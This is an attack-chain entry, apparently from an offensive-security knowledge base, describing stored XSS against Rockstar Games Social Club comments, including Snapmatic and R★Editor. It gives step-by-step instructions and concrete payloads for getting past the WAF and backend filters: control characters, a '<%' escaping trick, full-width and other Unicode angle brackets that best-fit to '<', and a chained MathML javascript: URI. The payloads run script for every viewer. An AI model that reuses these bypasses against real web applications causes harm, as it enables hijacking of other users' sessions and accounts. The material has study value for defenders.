---
id: ac-rockstar-xss-chain-001
tags:
  - xss
  - stored-xss
  - waf-bypass
  - unicode-bypass
  - filter-bypass
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
complexity: high
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Bypass-WAF-with-Control-Characters-for-XSS]]'
  - '[[procedures/Bypass-Filter-with-Percentage-Sign-for-Unescaped-Tag]]'
  - '[[procedures/Exploit-Unicode-Variants-and-Best-Fit-Matching-for-XSS]]'
  - '[[procedures/Chain-Multiple-Techniques-for-MathML-JavaScript-Injection]]'
  - '[[procedures/Exploit-Variant-Unicode-Brackets-in-Snapmatic-and-REditor]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:56:03.371Z'
description: >-
  Multi-stage exploitation of stored XSS in Rockstar Games Social Club comments,
  including Snapmatic and R★Editor, by iteratively bypassing WAF and backend
  filters using control characters, percentage signs, Unicode variants, and
  chained techniques to inject and execute arbitrary JavaScript.
skill_level: advanced
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Chained Stored XSS Bypasses in Rockstar Social Club Comments

Multi-stage attack chain demonstrating iterative exploitation of stored XSS vulnerabilities in Rockstar Games Social Club comments, including Snapmatic and R★Editor sections. The attack begins with discovering initial filter weaknesses and progresses through multiple bypasses as fixes are applied, ultimately allowing injection of arbitrary JavaScript that executes when other users view the comments. This chain highlights the importance of robust input validation and WAF rules against evasion techniques like control characters, encoding tricks, and Unicode normalization.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~30 minutes |
| Skill Level | Advanced |
| Complexity | High |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Discover Initial Bypass] --> B[Evade First Fix with %] --> C[Use Unicode Variants] --> D[Chain Techniques for MathML] --> E[Exploit Variant in Specific Sections]
    E --> F[JS Execution on View]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#9b59b6
    style F fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser with developer tools for payload testing
- Access to Rockstar Social Club account for posting comments

### Target Environment

- Rockstar Games Social Club platform (Web)
- Services: Social Club comments, Snapmatic, R★Editor
- Inferred backend: Windows stack with WAF
- No specific ports required; standard HTTPS access

### Initial Access Requirements

- Valid user account on Social Club
- Ability to post comments in targeted sections
- No elevated privileges needed; exploits stored nature for other users

## Detailed Attack Procedures

### Step 1: Discover Initial Bypass
procedure: [[procedures/Bypass-WAF-with-Control-Characters-for-XSS]]

**Objective**: Identify and exploit WAF weakness using control characters to inject partial HTML tags without triggering removal patterns.

**Instructions**: Log into Social Club and navigate to a comment section (e.g., Snapmatic). Craft a payload injecting '<' followed by control characters like \t to evade the WAF pattern '<.*'. Submit the comment and view it to test for tag injection.

**Expected Output**: The comment renders with an unescaped '<' allowing partial tag formation, such as starting a script tag.

**Success Indicators**:
- WAF does not strip the '<'
- Partial HTML tag appears in the DOM when inspected

### Step 2: Evade Fix with Percentage Sign
procedure: [[procedures/Bypass-Filter-with-Percentage-Sign-for-Unescaped-Tag]]

**Objective**: After the initial fix, use a single '%' to confuse backend escaping, producing an unescaped '<' alongside the escaped version.

**Instructions**: Update the payload to include '<%' before a script tag, e.g., '<% <script src=//...? >'. Post in the comments and inspect the rendered output for malformed escaping.

**Expected Output**: Backend produces '&lt;%<script/src="//...?" <="" p="">', where the '<' is unescaped due to the '%'. 

**Success Indicators**:
- Escaped and unescaped '<' coexist in output
- Script tag partially injects without full stripping

### Step 3: Exploit Unicode Variants
procedure: [[procedures/Exploit-Unicode-Variants-and-Best-Fit-Matching-for-XSS]]

**Objective**: Bypass stricter WAF rules using Full-Width and Small-Forms Unicode variants combined with '%' to leverage best-fit matching in the Windows stack.

**Instructions**: Craft payload with Unicode like \uFE64%\uFF1Cscript/src=//...? . Submit and test; if fixed, iterate to \uFF1C%\uFE64input/autofocus onfocus\b='[1].find(alert)'. View the comment to trigger execution.

**Expected Output**: WAF evades, producing '&lt;%<script/src="//...?" class="badLink">'; later, DOM event handler executes alert.

**Success Indicators**:
- Unicode maps to '<' via best-fit
- JavaScript alert fires on focus

### Step 4: Chain Multiple Techniques
procedure: [[procedures/Chain-Multiple-Techniques-for-MathML-JavaScript-Injection]]

**Objective**: Combine eight evasion techniques to inject a clickable MathML element with a JavaScript URI, executing code on interaction and disrupting comment functionality.

**Instructions**: Build complex payload: '&<>lt;%&<>lt;m\bath xml:base=\"j<>avascript:alert(document.domain)//\" href=#\"[bad.url.pls]'. Post in comments, then click the rendered element to test execution.

**Expected Output**: Renders as '&lt%<math xml:base="javascript:alert(document.domain)//" href="#" x="" class="badLink">[bad.url.pls]', executing alert on click; comments become un-repliable/un-deletable.

**Success Indicators**:
- MathML element injects and is clickable
- alert(document.domain) executes
- UI disruption observed

### Step 5: Exploit in Specific Sections
procedure: [[procedures/Exploit-Variant-Unicode-Brackets-in-Snapmatic-and-REditor]]

**Objective**: Target validation differences in Snapmatic/R★Editor using alternative Unicode left-angle brackets that best-fit to '<' on a different codepage.

**Instructions**: In Snapmatic or R★Editor comments, inject '〈script/src=//...? >' using U+3008 or U+2329. Submit and view to confirm script injection.

**Expected Output**: Payload bypasses blocks on standard Unicode, matching to '<' in the stack for script execution.

**Success Indicators**:
- Script tag renders in specific sections
- Arbitrary JS executes for viewers

## Attack Chain Summary

### Key Achievements

1. Successfully bypassed initial WAF with control characters to enable partial XSS.
2. Evaded iterative fixes using '%' and Unicode for persistent injection.
3. Chained techniques to achieve full JS execution via MathML, impacting user interactions.
4. Exploited platform-specific validation differences for targeted sections.
5. Demonstrated high-impact stored XSS affecting all comment viewers.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

---

*Last updated: 2023-10-01T00:00:00Z*
